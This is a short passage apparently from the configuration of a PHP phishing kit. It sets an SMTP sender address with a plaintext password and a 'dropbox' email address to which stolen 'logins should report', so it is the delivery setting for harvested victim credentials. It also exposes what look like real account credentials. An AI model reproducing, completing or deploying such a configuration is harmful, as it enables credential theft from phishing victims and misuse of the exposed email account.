...
$smtpuser = 'john.decarlo.r@gmail.com'; // enter the email address of the smtp you want to use
$userpass = 'mat1234@'; // enter the password of the smtp you want to use
$dropbox =  'otto.moxley@andsee.org'; // enter email address your your logins should report
